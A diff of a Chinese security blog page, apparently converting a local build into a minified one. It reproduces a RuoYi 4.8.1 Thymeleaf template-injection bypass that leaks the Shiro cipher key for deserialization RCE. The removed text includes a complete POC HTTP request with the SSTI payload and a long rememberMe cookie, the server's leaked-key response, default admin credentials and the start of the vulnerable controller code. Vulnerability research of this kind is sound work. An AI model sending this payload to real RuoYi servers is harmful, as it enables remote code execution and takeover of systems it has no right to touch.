@@ -1,1447 +1,166 @@
-<!DOCTYPE html>
-<html lang="en" dir="auto" data-theme="auto">
-
-<head><script src="/xvsf/livereload.js?mindelay=10&amp;v=2&amp;port=55722&amp;path=xvsf/livereload" data-no-instant defer></script><meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
-<title>若依4.8.1漏洞 SSTI绕过获取ShiroKey至RCE | xvsf</title>
-<meta name="keywords" content="">
-<meta name="description" content="参考文章：
+<!doctype html><html lang=en dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>若依4.8.1漏洞 SSTI绕过获取ShiroKey至RCE | xvsf</title><meta name=keywords content><meta name=description content="参考文章：
 若依最新版本4.8.1漏洞 SSTI绕过获取ShiroKey至RCE(全JAVA版本绕过，附带POC)
 https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
-某依最新版本稳定4.8.1 RCE (Thymeleaf模板注入绕过)">
-<meta name="author" content="map[name:xvsf]">
-<link rel="canonical" href="http://localhost:55722/xvsf/posts/%E8%8B%A5%E4%BE%9D4.8.1%E6%BC%8F%E6%B4%9E-ssti%E7%BB%95%E8%BF%87%E8%8E%B7%E5%8F%96shirokey%E8%87%B3rce/">
-<link crossorigin="anonymous" href="/xvsf/assets/css/stylesheet.5ad107ca90037afb3a2f9d7fc96f23d6c8c13a0f220ed624d29d3898eab3113c.css" integrity="sha256-WtEHypADevs6L51/yW8j1sjBOg8iDtYk0p04mOqzETw=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:55722/xvsf/img/2.jpg">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:55722/xvsf/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:55722/xvsf/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:55722/xvsf/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:55722/xvsf/safari-pinned-tab.svg">
-<meta name="theme-color" content="#2e2e33">
-<meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:55722/xvsf/posts/%E8%8B%A5%E4%BE%9D4.8.1%E6%BC%8F%E6%B4%9E-ssti%E7%BB%95%E8%BF%87%E8%8E%B7%E5%8F%96shirokey%E8%87%B3rce/">
-<noscript>
-    <style>
-        #theme-toggle,
-        .top-link {
-            display: none;
-        }
-
-    </style>
-    <style>
-        @media (prefers-color-scheme: dark) {
-            :root {
-                --theme: rgb(29, 30, 32);
-                --entry: rgb(46, 46, 51);
-                --primary: rgb(218, 218, 219);
-                --secondary: rgb(155, 156, 157);
-                --tertiary: rgb(65, 66, 68);
-                --content: rgb(196, 196, 197);
-                --code-block-bg: rgb(46, 46, 51);
-                --code-bg: rgb(55, 56, 62);
-                --border: rgb(51, 51, 51);
-                color-scheme: dark;
-            }
-
-            .list {
-                background: var(--theme);
-            }
-
-            .toc {
-                background: var(--entry);
-            }
-        }
-
-        @media (prefers-color-scheme: light) {
-            .list::-webkit-scrollbar-thumb {
-                border-color: var(--code-bg);
-            }
-        }
-
-    </style>
-</noscript>
-<script>
-    if (localStorage.getItem("pref-theme") === "dark") {
-        document.querySelector("html").dataset.theme = 'dark';
-    } else if (localStorage.getItem("pref-theme") === "light") {
-       document.querySelector("html").dataset.theme = 'light';
-    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
-        document.querySelector("html").dataset.theme = 'dark';
-    } else {
-        document.querySelector("html").dataset.theme = 'light';
-    }
-
-</script>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;700&display=swap">
-
-
-<div id="lightbox-overlay" class="lightbox-overlay" aria-hidden="true">
-    <button class="lightbox-close" aria-label="关闭">&times;</button>
-    <img class="lightbox-img" alt="">
-</div>
-
-
-<div class="progress-bar"></div>
-
-
-<script>
-document.addEventListener('DOMContentLoaded', () => {
-    const progressBar = document.querySelector('.progress-bar');
-
-    
-    const calculateScrollProgress = () => {
-        const windowHeight = window.innerHeight;
-        const documentHeight = document.documentElement.scrollHeight - windowHeight;
-        const scrollTop = window.scrollY;
-        const progress = (scrollTop / documentHeight) * 100;
-        progressBar.style.width = `${progress}%`;
-    };
-
-    
-    window.addEventListener('scroll', calculateScrollProgress);
-
-    
-    calculateScrollProgress();
-});
-</script>
-
-
-
-</head>
-<body id="top">
-    <header class="header">
-    <nav class="nav">
-        <div class="logo">
-            <a href="http://localhost:55722/xvsf/" accesskey="h" title="xvsf (Alt + H)">xvsf</a>
-            <div class="logo-switches">
-                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
-                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
-                    </svg>
-                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <circle cx="12" cy="12" r="5"></circle>
-                        <line x1="12" y1="1" x2="12" y2="3"></line>
-                        <line x1="12" y1="21" x2="12" y2="23"></line>
-                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
-                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
-                        <line x1="1" y1="12" x2="3" y2="12"></line>
-                        <line x1="21" y1="12" x2="23" y2="12"></line>
-                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
-                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
-                    </svg>
-                </button>
-            </div>
-        </div>
-        <ul id="menu">
-            <li>
-                <a href="http://localhost:55722/xvsf/" title="首页">
-                    <span>首页</span>
-                </a>
-            </li>
-            <li>
-                <a href="http://localhost:55722/xvsf/posts/" title="文章">
-                    <span>文章</span>
-                </a>
-            </li>
-            <li>
-                <a href="http://localhost:55722/xvsf/categories/" title="归类">
-                    <span>归类</span>
-                </a>
-            </li>
-            <li>
-                <a href="http://localhost:55722/xvsf/search/" title="搜索 (Alt &#43; /)" accesskey=/>
-                    <span>搜索</span>
-                </a>
-            </li>
-            <li>
-                <a href="http://localhost:55722/xvsf/about/" title="关于">
-                    <span>关于</span>
-                </a>
-            </li>
-        </ul>
-    </nav>
-</header>
-<main class="main">
-
-<article class="post-single">
-  <header class="post-header">
-    
-    <h1 class="post-title entry-hint-parent">
-      若依4.8.1漏洞 SSTI绕过获取ShiroKey至RCE
-    </h1>
-    <div class="post-meta"><span title='2026-01-07 10:00:00 +0800 CST'>January 7, 2026</span>&nbsp;·&nbsp;<span class='reading-time-coffee' title='预计阅读 5 分钟'>☕☕ 5 min</span>&nbsp;·&nbsp;map[name:xvsf]&nbsp;·&nbsp;
-
-</div>
-  </header> 
-
-  
-  
-  <div class="post-content" style="position: relative;">
-    
-    <aside id="toc-container" class="toc-container wide">
-    <div class="toc">
-        <details  open>
-            <summary accesskey="c" title="(Alt + C)">
-                <span class="details">Table of Contents</span>
-            </summary>
-
-            <div class="inner"><ul>
-                    <li>
-                        <a href="#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0" aria-label="参考文章：">参考文章：</a></li>
-                    <li>
-                        <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" aria-label="环境搭建">环境搭建</a></li>
-                    <li>
-                        <a href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0" aria-label="漏洞复现">漏洞复现</a></li>
-                    <li>
-                        <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" aria-label="漏洞分析">漏洞分析</a><ul>
-                            
-                    <li>
-                        <a href="#%e6%bc%8f%e6%b4%9e%e7%82%b9" aria-label="漏洞点">漏洞点</a></li>
-                    <li>
-                        <a href="#payload-%e8%a7%a3%e6%9e%90" aria-label="Payload 解析">Payload 解析</a></li>
-                    <li>
-                        <a href="#%e6%bc%8f%e6%b4%9e%e9%93%be%e6%b3%84%e9%9c%b2-shiro-key--%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96-rce" aria-label="漏洞链：泄露 Shiro Key → 反序列化 RCE">漏洞链：泄露 Shiro Key → 反序列化 RCE</a>
-                    </li>
-                </ul>
-                </li>
-                </ul>
-            </div>
-        </details>
-    </div>
-</aside>
-<script>
-    let activeElement;
-    let elements;
-    
-    document.addEventListener('DOMContentLoaded', function (event) {
-        checkTocPosition();
-    
-        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
-        if (elements.length > 0) {
-            
-            activeElement = elements[0];
-            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
-            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
-        }
-    
-        
-        const topLink = document.getElementById('top-link');
-        if (topLink) {
-            topLink.addEventListener('click', (event) => {
-                
-                event.preventDefault();
-    
-                
-                window.scrollTo({ top: 0, behavior: 'smooth' });
-            });
-        }
-    }, false);
-    
-    window.addEventListener('resize', function(event) {
-        checkTocPosition();
-    }, false);
-    
-    window.addEventListener('scroll', () => {
-        
-        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
-    
-        
-        if (scrollPosition === 0) {
-            return;
-        }
-    
-        
-        if (elements && elements.length > 0) {
-            
-            activeElement = Array.from(elements).find((element) => {
-                if ((getOffsetTop(element) - scrollPosition) > 0 && 
-                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
-                    return element;
-                }
-            }) || activeElement;
-    
-            elements.forEach(element => {
-                const id = encodeURI(element.getAttribute('id')).toLowerCase();
-                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
-                if (element === activeElement){
-                    tocLink.classList.add('active');
-    
-                    
-                    const tocContainer = document.querySelector('.toc .inner');
-                    const linkOffsetTop = tocLink.offsetTop;
-                    const containerHeight = tocContainer.clientHeight;
-                    const linkHeight = tocLink.clientHeight;
-    
-                    
-                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
-                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
-                } else {
-                    tocLink.classList.remove('active');
-                }
-            });
-        }
-    }, false);
-    
-    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
-    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
-    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
-    
-    function checkTocPosition() {
-        const width = document.body.scrollWidth;
-    
-        if (width - main - (toc * 2) - (gap * 4) > 0) {
-            document.getElementById("toc-container").classList.add("wide");
-        } else {
-            document.getElementById("toc-container").classList.remove("wide");
-        }
-    }
-    
-    function getOffsetTop(element) {
-        if (!element.getClientRects().length) {
-            return 0;
-        }
-        let rect = element.getBoundingClientRect();
-        let win = element.ownerDocument.defaultView;
-        return rect.top + win.pageYOffset;   
-    }
-    
-</script>
-<h1 id="参考文章">参考文章：<a hidden class="anchor" aria-hidden="true" href="#参考文章">#</a></h1>
-<p>若依最新版本4.8.1漏洞 SSTI绕过获取ShiroKey至RCE(全JAVA版本绕过，附带POC)</p>
-<p><a href="https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ">https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ</a></p>
-<p>某依最新版本稳定4.8.1 RCE (Thymeleaf模板注入绕过)</p>
-<p><a href="https://mp.weixin.qq.com/s/uxvGbO4biM87DVSXA_ZlQw">https://mp.weixin.qq.com/s/uxvGbO4biM87DVSXA_ZlQw</a></p>
-<h1 id="环境搭建">环境搭建<a hidden class="anchor" aria-hidden="true" href="#环境搭建">#</a></h1>
-<p>源码：</p>
-<p><a href="https://github.com/yangzongzhuan/RuoYi/releases">https://github.com/yangzongzhuan/RuoYi/releases</a></p>
-<p>参考文档：RuoYi-4.8.1\doc\若依环境使用手册.docx</p>
-<p>导入数据库</p>
-<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144229.png" style="max-width: 100%; height: auto;"></p>
-<p>修改数据库配置：RuoYi-4.8.1\ruoyi-admin\src\main\resources\application-druid.yml</p>
-<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144591.png" style="max-width: 100%; height: auto;"></p>
-<p>服务器端口：RuoYi-4.8.1\ruoyi-admin\src\main\resources\application.yml</p>
-<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144282.png" style="max-width: 100%; height: auto;"></p>
-<p>启动若依</p>
-<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071145405.png" style="max-width: 100%; height: auto;">
-<img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071145541.png" style="max-width: 100%; height: auto;"></p>
-<p>默认密码为 admin/admin123</p>
-<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071145857.png" style="max-width: 100%; height: auto;">
-<img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144394.png" style="max-width: 100%; height: auto;"></p>
-<h1 id="漏洞复现">漏洞复现<a hidden class="anchor" aria-hidden="true" href="#漏洞复现">#</a></h1>
-<p>POC：</p>
-<div class="code-block-container" id="code-1772962473814947100" data-expanded="false" role="region" aria-labelledby="btn-code-1772962473814947100">
-    <div class="code-header">
-        <div class="mac-buttons">
-            <span class="mac-button red"></span>
-            <span class="mac-button yellow"></span>
-            <span class="mac-button green"></span>
-        </div>
-        <span class="code-language">html</span>
-        <div class="code-actions">
-            <button class="copy-btn" title="Copy" aria-label="复制代码">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
-            </button>
-            <button class="toggle-btn" id="btn-code-1772962473814947100" title="Toggle" aria-expanded="false" aria-controls="code-1772962473814947100" aria-label="展开或折叠代码块">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
-            </button>
-        </div>
-    </div>
-    <div class="code-content" id="code-1772962473814947100-content"><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
-</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
-</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
-</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
-</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
-</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
-</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
-</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
-</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
-</span><span class="lnt" id="10"><span class="lnlinks">10</span>
-</span><span class="lnt" id="11"><span class="lnlinks">11</span>
-</span><span class="lnt" id="12"><span class="lnlinks">12</span>
-</span><span class="lnt" id="13"><span class="lnlinks">13</span>
-</span><span class="lnt" id="14"><span class="lnlinks">14</span>
-</span><span class="lnt" id="15"><span class="lnlinks">15</span>
-</span><span class="lnt" id="16"><span class="lnlinks">16</span>
-</span><span class="lnt" id="17"><span class="lnlinks">17</span>
-</span><span class="lnt" id="18"><span class="lnlinks">18</span>
-</span><span class="lnt" id="19"><span class="lnlinks">19</span>
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">POST /monitor/cache/getNames  HTTP/1.1
-</span></span><span class="line"><span class="cl">Host: 127.0.0.1
-</span></span><span class="line"><span class="cl">Cookie: JSESSIONID=3e7df59c-7b52-4b63-9828-d1a60bcf62e2; rememberMe=B0TaCdqwpiQ71CzTg17A8BWKyB+D/Uove1bPnWCVmMQwgiMmqY/UJ3aHTH9pJs71i562+HZJEw5A1ry1e9rvLfwGER4dX5oI3EtOclbewoxKSoxuJ3QryUkNDesGD7t4aHVcy4JexjCL/YvfvUn57qu3Kc9OCmG+a0e86oWJnfLK/8Jo6XUj8f4SsYXOygtSTECn5AWnuQZnaRhTGcYJT5sgnckJgLn+k2oA/5UEVtpEK8GPQgDhyUXCNEefnTsROrtVqYBOYSb/ghztJTL1zm9tKjh9AgErrsgfx90Z5DFbLrABi4+NTjTr6bWqsa+lBV+u+pgY+Fb0mhKibkBDLr1VRnTqltPl33pL/BWLB3FHMX1LdUV2dS7d8+lkvCbQMFdqd1oBYMZ/+MilgY5JsqHd9ZkY35MtGNqLL4iS9bjzOul+zHVJVC88ODgfd8OMpUrEfhTeoO4jubK4+ZimfgE7JsUuO7l31Qqi3TC2OiGdlF29jXrF1ojJB8k3kEtQba3i4CLoTulRSfF/rhtIfB/qyGoBlrddXC3rwhf2DjtmVoCrWbbeYpXzsxa5s8oZSpBC5/VsJ0UO3mrlLeI5ISOY2A6rfzYLWTvvAYcMptS/rdQ1NNhlnG0pD1UaNa3igS9aU9nEWGl0ICv6izkeYxi1Wiqug+q0NswJKOyowT7KWRhNu5lWWRzkjKrpqgn5hA++9i7lQ5B5Iu1QB4xD0fWa8eiHqpVAHush70ONg/wKERmpKUjWNSmLu3L/Tcc/59PcXUTN1rVVi8z72Gve8K7Z1WNCbSJtrfIZd0KFeC8CmEQG5KYMPJ5hZIJqhSkw5vGOha517RYtVjfs1rRTrABOvg+vJi1byIJIap5+i68/UgxwQnrg75VZ673NyukuMmUjJHHziX8n9Ce7rQ/j4/8HaIiKWnPOZMBCVbbVk8kZCfYApVVzsN+o4YCooL+jkK6m4mTCvNQ+ARAF2iF5lKKgc0eiOeWictvdGcAkV0GR4lb5yszMEGezxd38cWYiu+nRMkgI8qX5613FODJAy8JF8q0Rql7KFmmFGVoFhe0XoPw4UlgFCfTh6Cix4RG04hAs1V8cQKA9T/q8NUSCDjQa7SBwWsRIo+GSoUJNtSQ3k5tr3PEppqzkteCnvFwY0uQjhUGGDPHilSzuPrmEekwrOKd+tveC8RTZMPLHnnnwmvyPFddtVyFZqcUC/UExKcHBA4aeA6qEO/GHMQwsvMh1nQt0FfE7+a+LSvllIgQtg9kMeR1cTd5PMBK2wNRVQlzhPIGcSW+On+RUOodiaQDLIE4dv7D+eUDs1507qatbyjFF4Zju11mTkzkXPtz7KwwPf9Ck//O9X1n43v2iClksiVqwD4O9SIMjsd4gjVk+LQMpu2ksxtdEeJ+TV2OSFJZtODWmkIcXUcBe5+BRNu0lQUqJ7X5rE1gKeM3t+En9N8E/4RCE1NL6aRFExBF2B2P78aTc8NCKQohwVlTyu8693CA7aB7H/bXCkJZIQ/K7IkR3OBYTO4oEfmFUgpleYjbKrZxKGcj3E4RpMRxBQYbVIybitUFeJM/Dl0YVx5Up1rwea+ZinsGjtIZLZ6gAIeiUy7Lwna1cvdWpxv4jmM8K7laouAYYWKUZVQts/fcvVURa4V674H6lcFQHuG1KecSgnRXxMCIx2H0xyJv14cEIxIM+7QK/ikpecscCluH/ggaWX9l6eALCQe9LivCQ3DKL1N/VEoTeuc+bVUwoON8WapYrYQSShsiJWMp5AbwmgLGNUFKP2MkiGD4sCQ8MIUssxt77himcsYw9ssyLc0zk+9LHJylpZkkTX4bnCMlJ5jnf9UhnGoLMZ4W28BOQnPaYzKEpQzV3bsFC4fld9oC6UGxaaH+ELLwhWdrL7tsk2SiGRGlllPdReSvFKXcvj9z7hFKDhZrpht/LU5pS5MTvgsa1rh+EisfjGlOf2NgXH7AbYVF83Qr03mzAvNLKTo3rHvDL9hfb2953VrLUtiUu6vXfxFJejkYH5IzmTGK+QAEg60hkAI5LWprwfUTk8gvHS67PKGYFHVkCaYumhqYSF43NcqE2BWTkGqNbTkeqsp/kIntL9RPmbIwbAjPp3x1WNBHQjcFGXTxQbiLVCSKP0yZNxBen3Grc16QD72GsGp5LWhDDIpvrExylszzCO7hLIhUvMtVu1afle3sxkUjbzO+orgGxCKOO6pbKI0pkbn8m2JpNklBki/9qIkjuF8XuHGkjIvJzpCeJuVv3NLHOh1/q14uS+AoxXxpyCWreqwWNR8eFMK/ral7RCfF7LFB+tHst1wlzzSOs16BwjHLYQvButfbq0SXEo02KVluPJLnGelIO/F0TOl2K9+elpPtai/bc1vyyV/lzEJxyWNGgU0ewEXIvv554TfUtpVBI1RqTUISvuqfi8x58rZnyHkfymSsJ/K0zfs3JHPYVM+2PXJgqX/VJRvOYV7eryI09/DhbXXNT+iWN/rCZW2pA0+lGJY00EeeO3eiEnENsF2GiQQCCyWF8/9Ue/Xi60WDpFSPyOLzi5X7WjTJf5/I343V/0xKCsbYgj3MEnepV/eGaPLsUPl1WsZH4N2MZxMlkELjkYsoFRhzmnH3O6kmieeG6UQ+gKljfqxiuKKMHEGCdy4yMi/vzpnb+zWHLP4ra2piOifK9pEBQ8OwJ8yEy1/yobL9uCCgfVWVJ/MqM8/tsGLv181cjwORwL8P5ZQCA1H3V3YDx8zr9140qZUhc99JZE7IJQm0C9aXbLMkOFVN9FA/2ZW6DHprhH/dyb8dyDnUqve/fa5f3FIKvSYK5yOy1Wl7FQU/gkU1gwwKMyprD3IdUVf97x0s=
-</span></span><span class="line"><span class="cl">Sec-Fetch-Site: same-origin
-</span></span><span class="line"><span class="cl">Sec-Fetch-User: ?1
-</span></span><span class="line"><span class="cl">Sec-Fetch-Mode: navigate
-</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br, zstd
-</span></span><span class="line"><span class="cl">sec-ch-ua-mobile: ?0
-</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.9
-</span></span><span class="line"><span class="cl">sec-ch-ua: &#34;Not:A-Brand&#34;;v=&#34;99&#34;, &#34;Google Chrome&#34;;v=&#34;145&#34;, &#34;Chromium&#34;;v=&#34;145&#34;
-</span></span><span class="line"><span class="cl">sec-ch-ua-platform: &#34;Windows&#34;
-</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
-</span></span><span class="line"><span class="cl">Sec-Fetch-Dest: document
-</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
-</span></span><span class="line"><span class="cl">Referer: http://127.0.0.1/monitor/job
-</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
-</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">fragment=__|$${#response.getWriter().print(&#39;&#39;.getClass().forName(&#39;java.util.Base64&#39;).getMethod(&#39;getEncoder&#39;).invoke(null).encodeToString(@securityManager.rememberMeManager.cipherKey))}|__::.x</span></span></code></pre></td></tr></table>
-</div>
-</div></div>
-</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144864.png" style="max-width: 100%; height: auto;"></p>
-<div class="code-block-container" id="code-1772962473819398200" data-expanded="false" role="region" aria-labelledby="btn-code-1772962473819398200">
-    <div class="code-header">
-        <div class="mac-buttons">
-            <span class="mac-button red"></span>
-            <span class="mac-button yellow"></span>
-            <span class="mac-button green"></span>
-        </div>
-        <span class="code-language">html</span>
-        <div class="code-actions">
-            <button class="copy-btn" title="Copy" aria-label="复制代码">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
-            </button>
-            <button class="toggle-btn" id="btn-code-1772962473819398200" title="Toggle" aria-expanded="false" aria-controls="code-1772962473819398200" aria-label="展开或折叠代码块">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
-            </button>
-        </div>
-    </div>
-    <div class="code-content" id="code-1772962473819398200-content"><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
-</span><span class="lnt" id="2"><span class="lnlinks">2</span>
-</span><span class="lnt" id="3"><span class="lnlinks">3</span>
-</span><span class="lnt" id="4"><span class="lnlinks">4</span>
-</span><span class="lnt" id="5"><span class="lnlinks">5</span>
-</span><span class="lnt" id="6"><span class="lnlinks">6</span>
-</span><span class="lnt" id="7"><span class="lnlinks">7</span>
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">HTTP/1.1 200
-</span></span><span class="line"><span class="cl">Content-Type: text/html; charset=ISO-8859-1
-</span></span><span class="line"><span class="cl">Content-Language: zh-CN
-</span></span><span class="line"><span class="cl">Date: Sat, 07 Mar 2026 02:24:08 GMT
-</span></span><span class="line"><span class="cl">Content-Length: 25
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">CEuLWXvwpGKpptw3aVUvQg==</span></span></code></pre></td></tr></table>
-</div>
-</div></div>
-</div><p>shiro 利用</p>
-<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144153.png" style="max-width: 100%; height: auto;"></p>
-<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144669.png" style="max-width: 100%; height: auto;"></p>
-<h1 id="漏洞分析">漏洞分析<a hidden class="anchor" aria-hidden="true" href="#漏洞分析">#</a></h1>
-<h2 id="漏洞点">漏洞点<a hidden class="anchor" aria-hidden="true" href="#漏洞点">#</a></h2>
-<p><code>RuoYi-4.8.1\ruoyi-admin\src\main\java\com\ruoyi\web\controller\monitor\CacheController.java</code></p>
-<div class="code-block-container" id="code-1772962473819398200" data-expanded="false" role="region" aria-labelledby="btn-code-1772962473819398200">
-    <div class="code-header">
-        <div class="mac-buttons">
-            <span class="mac-button red"></span>
-            <span class="mac-button yellow"></span>
-            <span class="mac-button green"></span>
-        </div>
-        <span class="code-language">java</span>
-        <div class="code-actions">
-            <button class="copy-btn" title="Copy" aria-label="复制代码">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
-            </button>
-            <button class="toggle-btn" id="btn-code-1772962473819398200" title="Toggle" aria-expanded="false" aria-controls="code-1772962473819398200" aria-label="展开或折叠代码块">
-                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
-            </button>
-        </div>
-    </div>
-    <div class="code-content" id="code-1772962473819398200-content"><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
-</span><span class="lnt" id="2"><span class="lnlinks">2</span>
-</span><span class="lnt" id="3"><span class="lnlinks">3</span>
-</span><span class="lnt" id="4"><span class="lnlinks">4</span>
-</span><span class="lnt" id="5"><span class="lnlinks">5</span>
-</span><span class="lnt" id="6"><span class="lnlinks">6</span>
-</span><span class="lnt" id="7"><span class="lnlinks">7</span>
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@RequiresPermissions</span><span class="p">(</span><span class="s">&#34;monitor:cache:view&#34;</span><span class="p">)</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@PostMapping</span><span class="p">(</span><span class="s">&#34;/getNames&#34;</span><span class="p">)</span><span class="w">
